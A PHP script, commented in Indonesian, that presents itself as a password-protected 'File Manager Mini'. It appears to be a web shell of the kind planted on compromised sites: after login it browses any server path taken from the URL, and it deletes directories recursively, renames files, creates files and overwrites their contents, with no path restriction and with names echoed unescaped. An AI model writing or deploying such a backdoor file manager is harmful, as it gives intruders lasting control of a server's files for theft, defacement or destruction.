<?php
session_start();

// Password hash (ganti dengan hash password Anda)
// Buat hash dengan: echo password_hash('password_anda', PASSWORD_DEFAULT);
$stored_hash = '$2y$10$ewOAVHj.unZ5VcGcCmrp4e.NVemtCEoT2NpeB1hkBNzzMlOGXP.kK';

// Proses login
if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['pass'])) {
    if (password_verify($_POST['pass'], $stored_hash)) {
        $_SESSION['authenticated'] = true;
        $_SESSION['login_time'] = time();
        header("Location: " . $_SERVER['PHP_SELF']);
        exit();
    } else {
        $error = "Password salah!";
    }
}

// Cek apakah sudah login
if (!isset($_SESSION['authenticated']) || $_SESSION['authenticated'] !== true) {
    // Tampilkan form login
    ?>
    <!DOCTYPE html>
    <html>
    <head>
        <title>Login Required</title>
        <style>
            body {background:#000;color:#fff;font-family:Arial;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;}
            .login-box {background:rgba(255,255,255,0.1);padding:40px;border-radius:10px;text-align:center;}
            h1 {margin-bottom:20px;}
            input {width:100%;padding:10px;margin-bottom:15px;border:none;border-radius:5px;background:rgba(255,255,255,0.1);color:#fff;}
            button {width:100%;padding:10px;background:#ff0000;color:#fff;border:none;border-radius:5px;cursor:pointer;}
            .error {color:#ff4444;margin-bottom:15px;}
        </style>
    </head>
    <body>
        <div class="login-box">
            <h1>Login</h1>
            <?php if (isset($error)): ?>
                <div class="error"><?php echo htmlspecialchars($error); ?></div>
            <?php endif; ?>
            <form method="POST">
                <input type="password" name="pass" placeholder="Password" required>
                <button type="submit">Login</button>
            </form>
        </div>
    </body>
    </html>
    <?php
    exit();
}

// Cek session timeout (30 menit)
$session_timeout = 30 * 60;
if (isset($_SESSION['login_time']) && (time() - $_SESSION['login_time']) > $session_timeout) {
    session_destroy();
    header("Location: " . $_SERVER['PHP_SELF']);
    exit();
}
$_SESSION['login_time'] = time();

// Lanjutkan dengan kode file manager jika sudah login
// Fungsi untuk mendapatkan daftar file dan folder di jalur tertentu
function getFiles($path)
{
    $files = scandir($path);
    $fileList = [];

    foreach ($files as $file) {
        if ($file != '.' && $file != '..') {
            $filePath = $path . '/' . $file;
            $fileInfo = [
                'name' => $file,
                'path' => $filePath,
                'type' => is_dir($filePath) ? 'folder' : 'file',
            ];
            array_push($fileList, $fileInfo);
        }
    }

    return $fileList;
}

// Fungsi untuk menghapus file atau folder
function deleteFile($path)
{
    if (is_file($path)) {
        return unlink($path);
    } elseif (is_dir($path)) {
        $files = array_diff(scandir($path), array('.', '..'));

        foreach ($files as $file) {
            deleteFile($path . '/' . $file);
        }

        return rmdir($path);
    }

    return false;
}

// Fungsi untuk mengganti nama file atau folder
function renameFile($oldPath, $newPath)
{
    return rename($oldPath, $newPath);
}

// Fungsi untuk membuat file baru
function createFile($path, $filename)
{
    $filePath = $path . '/' . $filename;
    return touch($filePath);
}

// Fungsi untuk membuat folder baru
function createDirectory($path, $dirname)
{
    $dirPath = $path . '/' . $dirname;
    return mkdir($dirPath);
}

// Fungsi untuk mengedit isi file
function editFile($filePath, $content)
{
    return file_put_contents($filePath, $content);
}

// Menangani permintaan aksi dari form
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action'])) {
    $action = $_POST['action'];
    $path = isset($_POST['path']) ? $_POST['path'] : '';

    if ($action === 'getFiles') {
        $fileList = getFiles($path);
        echo json_encode($fileList);
        exit;
    } elseif ($action === 'delete' && isset($_POST['deletePath'])) {
        $deletePath = $_POST['deletePath'];
        $success = deleteFile($deletePath);

        if ($success) {
            echo 'File atau folder berhasil dihapus.';
        } else {
            echo 'Tidak dapat menghapus file atau folder.';
        }
        exit;
    } elseif ($action === 'rename' && isset($_POST['oldPath']) && isset($_POST['newPath'])) {
        $oldPath = $_POST['oldPath'];
        $newPath = $_POST['newPath'];
        $success = renameFile($oldPath, $newPath);

        if ($success) {
            echo 'File atau folder berhasil diubah namanya.';
        } else {
            echo 'Tidak dapat mengganti nama file atau folder.';
        }
        exit;
    } elseif ($action === 'createFile' && isset($_POST['filename'])) {
        $filename = $_POST['filename'];
        $success = createFile($path, $filename);

        if ($success) {
            echo 'File berhasil dibuat.';
        } else {
            echo 'Tidak dapat membuat file.';
        }
        exit;
    } elseif ($action === 'createDirectory' && isset($_POST['dirname'])) {
        $dirname = $_POST['dirname'];
        $success = createDirectory($path, $dirname);

        if ($success) {
            echo 'Folder berhasil dibuat.';
        } else {
            echo 'Tidak dapat membuat folder.';
        }
        exit;
    } elseif ($action === 'editFile' && isset($_POST['filePath']) && isset($_POST['content'])) {
        $filePath = $_POST['filePath'];
        $content = $_POST['content'];
        $success = editFile($filePath, $content);

        if ($success) {
            echo 'File berhasil diedit.';
        } else {
            echo 'Tidak dapat mengedit file.';
        }
        exit;
    }
}

// Fungsi untuk menampilkan daftar folder
function listDirectories($path)
{
    $directories = glob($path . '/*', GLOB_ONLYDIR);
    foreach ($directories as $directory) {
        $directoryName = basename($directory);
        echo '<li>';
        echo '<span class="file-icon">';
        echo '<img src="https://img.icons8.com/color/48/000000/folder-invoices.png" alt="Ikon Folder">';
        echo '</span>';
        echo '<span class="file-name">' . $directoryName . '</span>';
        echo '<a href="?path=' . $directory . '">Lihat</a>';
        echo '</li>';
    }
}

// Fungsi untuk menampilkan daftar file
function listFiles($path)
{
    $files = glob($path . '/*');
    foreach ($files as $file) {
        if (!is_dir($file)) {
            $fileName = basename($file);
            echo '<li>';
            echo '<span class="file-icon">';
            echo '<img src="https://img.icons8.com/color/48/000000/file.png" alt="Ikon File">';
            echo '</span>';
            echo '<span class="file-name">' . $fileName . '</span>';
            echo '<a href="' . $file . '" download>Unduh</a>';
            echo '</li>';
        }
    }
}

// Jalur awal
$initialPath = isset($_GET['path']) ? $_GET['path'] : __DIR__;
$fileList = getFiles($initialPath);
?>

<!DOCTYPE html>
<html>
<head>
    <title>File Manager Mini</title>
    <style>
        body {
            background-color: #000000;
            color: white;
            font-family: Arial, sans-serif;
            margin: 20px;
        }

        h1 {
            margin-bottom: 20px;
        }

        .file-list {
            list-style-type: none;
            padding: 0;
        }

        .file-list li {
            display: flex;
            align-items: center;
            margin-bottom: 5px;
        }

        .file-list li .file-icon {
            margin-right: 10px;
        }

        .file-list li .file-name {
            flex-grow: 1;
        }

        .actions {
            margin-top: 10px;
        }

        .actions input[type="text"] {
            margin-right: 10px;
        }

        .actions input[type="submit"] {
            cursor: pointer;
        }
        
        .logout-btn {
            background: #ff0000;
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 5px;
            cursor: pointer;
            margin-bottom: 20px;
        }
    </style>
</head>
<body>
<div style="text-align: right;">
    <form method="post" style="display: inline;">
        <input type="hidden" name="logout" value="true">
        <button type="submit" class="logout-btn">Logout</button>
    </form>
</div>

<h1>Manajer File</h1>

<div class="current-directory">
    Direktori saat ini: <?php echo realpath($initialPath); ?>
</div>

<ul class="file-list">
    <?php listDirectories($initialPath); ?>
    <?php listFiles($initialPath); ?>
</ul>

<div class="actions">
    <form method="POST" enctype="multipart/form-data">
        <input type="hidden" name="action" value="delete">
        <input type="hidden" name="path" value="<?php echo $initialPath; ?>">
        <input type="text" name="deletePath" placeholder="Masukkan jalur file atau folder untuk dihapus" required>
        <input type="submit" value="Hapus">
    </form>
    <form method="POST" enctype="multipart/form-data">
        <input type="hidden" name="action" value="rename">
        <input type="hidden" name="path" value="<?php echo $initialPath; ?>">
        <input type="text" name="oldPath" placeholder="Jalur file atau folder lama" required>
        <input type="text" name="newPath" placeholder="Jalur file atau folder baru" required>
        <input type="submit" value="Ganti Nama">
    </form>
    <form method="POST" enctype="multipart/form-data">
        <input type="hidden" name="action" value="createFile">
        <input type="hidden" name="path" value="<?php echo $initialPath; ?>">
        <input type="text" name="filename" placeholder="Nama file baru" required>
        <input type="submit" value="Buat File">
    </form>
    <form method="POST" enctype="multipart/form-data">
        <input type="hidden" name="action" value="createDirectory">
        <input type="hidden" name="path" value="<?php echo $initialPath; ?>">
        <input type="text" name="dirname" placeholder="Nama folder baru" required>
        <input type="submit" value="Buat Folder">
    </form>
    <form method="POST" enctype="multipart/form-data">
        <input type="hidden" name="action" value="editFile">
        <input type="hidden" name="path" value="<?php echo $initialPath; ?>">
        <input type="text" name="filePath" placeholder="Jalur file yang akan diedit" required>
        <textarea name="content" rows="5" cols="40" placeholder="Isi baru file" required></textarea>
        <input type="submit" value="Simpan Perubahan">
    </form>
</div>

<?php
// Handle logout
if (isset($_POST['logout'])) {
    session_destroy();
    header("Location: " . $_SERVER['PHP_SELF']);
    exit();
}
?>
</body>
</html>